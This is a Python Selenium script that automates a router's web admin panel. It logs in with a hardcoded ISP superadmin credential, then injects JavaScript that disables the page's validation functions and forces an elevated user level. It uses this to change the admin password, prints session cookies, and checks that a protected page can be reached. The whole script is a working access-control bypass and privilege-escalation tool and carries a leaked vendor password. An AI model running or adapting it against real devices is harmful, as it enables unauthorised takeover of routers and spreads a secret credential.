#!/usr/bin/env python3
"""Click the real Update button and handle navigation."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"
NEW_PWD = "Admin9999"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(30)
    return driver

driver = setup_driver()
try:
    print("1. Login as superadmin...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(4)
    u = driver.find_element(By.ID, "txt_Username")
    p = driver.find_element(By.ID, "txt_Password")
    driver.execute_script("arguments[0].value='';", u)
    driver.execute_script("arguments[0].value='';", p)
    u.send_keys("adminpldt")
    p.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
    driver.execute_script("window.setDisable = function() {}; document.getElementById('button').style.display = '';")
    driver.find_element(By.ID, "button").click()
    time.sleep(5)

    level = str(driver.execute_script("return window.Userlevel;"))
    print("   Userlevel:", level)

    # Fill form
    print("2. Filling form (keep Userlevel=2 for superadmin change)...")
    driver.execute_script("document.getElementById('old_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")
    driver.execute_script("document.getElementById('new_password').value = '" + NEW_PWD + "';")
    driver.execute_script("document.getElementById('confirm_password').value = '" + NEW_PWD + "';")
    driver.execute_script("window.CheckParameter = function() { return true; };")
    driver.execute_script("window.Userlevel = 2;")

    # Monitor navigation
    driver.execute_script("""
        window._navigated = false;
        window.addEventListener('beforeunload', function() { window._navigated = true; });
    """)

    print("3. Clicking Update button...")
    driver.find_element(By.ID, "button_update").click()

    # Wait for navigation
    time.sleep(10)

    url_after = driver.current_url
    cookies = driver.get_cookies()
    print("   URL:", url_after)
    print("   Cookies:", [(c["name"], c["value"][:50]) for c in cookies])

    try:
        text = driver.execute_script("return document.body ? document.body.innerText.substring(0, 500) : '';")
        print("   Text:", text[:300])
        src_len = len(driver.page_source)
        print("   Page size:", src_len)
    except:
        print("   (page may have navigated)")

    # Check where we are
    print("\n4. Current state check...")
    try:
        url_now = driver.current_url
        print("   URL now:", url_now)
        src = driver.page_source
        has_login = "txt_Username" in src
        has_pwd_form = "old_password" in src
        print("   Has login form:", has_login)
        print("   Has password form:", has_pwd_form)

        if has_login and not has_pwd_form:
            print("   -> Redirected to login page (form may have worked!)")

            # Try to login with new admin password
            u2 = driver.find_element(By.ID, "txt_Username")
            p2 = driver.find_element(By.ID, "txt_Password")
            driver.execute_script("arguments[0].value='';", u2)
            driver.execute_script("arguments[0].value='';", p2)
            u2.send_keys("admin")
            p2.send_keys(NEW_PWD)
            driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
            driver.execute_script("document.getElementById('button').style.display='';")
            driver.find_element(By.ID, "button").click()
            time.sleep(4)

            url_login = driver.current_url
            has_login2 = "txt_Username" in driver.page_source
            print("   admin:" + NEW_PWD + " -> URL:", url_login, "login:", has_login2)

            if not has_login2:
                driver.get(ROUTER + "/html/amp/wlanbasic/WlanBasic.asp?2G")
                time.sleep(3)
                ok = "txt_Username" not in driver.page_source
                print("   Protected page:", ok)
                if ok:
                    print("\n*** SUCCESS! admin:" + NEW_PWD + " ***")
    except Exception as e:
        print("   Error:", e)

finally:
    driver.quit()
